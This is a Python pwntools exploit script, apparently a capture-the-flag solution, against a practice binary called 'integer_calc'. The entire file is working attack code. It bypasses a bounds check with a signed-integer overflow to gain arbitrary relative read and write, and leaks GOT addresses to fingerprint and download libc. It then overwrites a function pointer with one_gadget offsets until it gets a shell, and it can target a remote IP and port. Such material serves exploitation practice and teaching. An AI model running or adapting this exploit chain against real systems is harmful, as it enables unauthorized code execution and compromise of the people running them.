from pwn import *
import argparse
import pwnc
import tempfile
from one_gadget import generate_one_gadget

context.terminal = "/bin/bash"
context.aslr = False
binary_name = "./integer_calc"
context.binary = binary_name
elf = context.binary

r = None

# max signed integer in 32 bit storage space
MAX_INT = 2147483647

MENU_END = b"> "

def get_index(location):
    # return corrected index so we bypass greater than check
    if(location & 7 != 0):
        log.error(f"{hex(location)} is not 8 byte aligned.")
    diff = int((location - elf.sym.numbers) / 8)

    if(diff >= 20):
        return MAX_INT + 1 + diff
    else:
        return diff

# we can read and write relative to the numbers global
def store(val, location):
    # to store val at location we need to determine what the offset of location
    # from numbers is in the form of a negative integer index. If the address
    # is before numbers we cannot write there with this

    index = get_index(location)

    log.info(f"Writing {hex(val)} to {hex(location)} by sending {hex(index)}")
    r.sendline(b"0")
    r.recvuntil(b"index: ")
    r.sendline(str(index).encode())
    r.recvuntil(b"value: ")
    r.sendline(str(val).encode())
    r.recvuntil(MENU_END)

def leak(location):
    # we can leak a location by using add with the desired location and a 
    # location that equals 0. By convention we will store 0 at index 0 when
    # program starts and not modify it

    index = get_index(location)
    log.info(f"Leaking {hex(location)} by sending 0 and {hex(index)}")

    r.sendline(b"2")
    r.recvuntil(b"index: ")
    r.sendline(b"0")
    r.recvuntil(b"index: ")
    r.sendline(str(index).encode())
    r.recvuntil(b"Addition result: ")
    result_val = int(r.recvuntil(b"\n"))
    r.recvuntil(MENU_END)
    return result_val
    

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--ip", help="remote ip", type=str, required=False, 
                        default="172.17.0.2")
    parser.add_argument("--port", help="remote port", type=int, required=False, 
                        default=4444)
    parser.add_argument("--debug", help="shows more verbose output", 
                        required=False, action="store_true", default=False)
    parser.add_argument("--pause", help="pause on start. Makes it easier to attach a debugger", 
                        action="store_true", default=False, required=False)
    parser.add_argument("--live", help="throw at the IP/port args provided to this program", 
                        action="store_true", default=False)
    parser.add_argument("--strace", 
                        help="enable strace run", 
                        action="store_true",
                        default=False)
    args = parser.parse_args()

    if(args.debug):
        context.log_level = "debug"

    global r
    if(args.live):
        r = remote(args.ip, args.port)
    elif(args.strace):
        r = process(["strace", binary_name])
    else:
        r = process(binary_name)

    if(args.pause):
        pause()


    # store 0 at [0] for use in the add method (to leak)
    store(0, elf.sym.numbers)

    # the following shows we can relative read/write. Now we need to use pwnc
    # to automate grabbing libc
    puts = leak(elf.got.puts)
    log.info(f"puts addr = {hex(puts)}")

    printf = leak(elf.got.printf)
    log.info(f"printf addr = {hex(printf)}")

    addrs = {"printf": printf, "puts": puts}

    # pwnc uses known addresses to calculate offsets and return a libc whose
    # offsets match. I havent seen it be wrong but it is possible
    log.info(f"Attempting to download libc...")
    try:
        libc_bytes = pwnc.get_libc(addrs)
    except pwnc.PWNCResponseError as e:
        log.error(f"bad connection to database or libc does not exist: {e}")
        return 1

    # now we can generate rop gadgets. We will use puts@got to store a gadget
    # and then send an invalid menu option number. This triggers a call to puts
    # and allows us to continue executing
    log.info(f"Looping over one gadgets from glibc...")
    with tempfile.NamedTemporaryFile() as fd:
        fd.write(libc_bytes)
        libc = ELF(fd.name) 
        
        first = True

        for offset in generate_one_gadget(fd.name):
            log.info(f"trying offset {offset}")

            # to allow us to use our first connection
            if(not first):
                if(args.live):
                    r = remote(args.ip, args.port)
                else:
                    r = process(binary_name)

            first = False
            
            # need 0 to leak with add method
            store(0, elf.sym.numbers)

            # get libc address since new process
            puts = leak(elf.got.puts)
            libc.address = puts - libc.sym.puts

            # write one_gadget to divide menu option and trigger it
            store(libc.address + offset, elf.sym.operations + (5*8))
            try:
                r.sendline(b"5")

                r.sendline(b"id")
                results = r.recvline()
                if(b"uid" in results):
                    log.success("Shell acquired ;)")
                    r.interactive()
                r.close()
                return 0
            except:
                log.warn(f"Failed with offset {offset}")
                continue
    return 1

if __name__ == "__main__":
    return_code = main()
    if(return_code == 1):
        log.error("Exploit failed.")
    elif(return_code == 0):
        log.success("Win!")
    else:
        log.warn("Bad return code.")


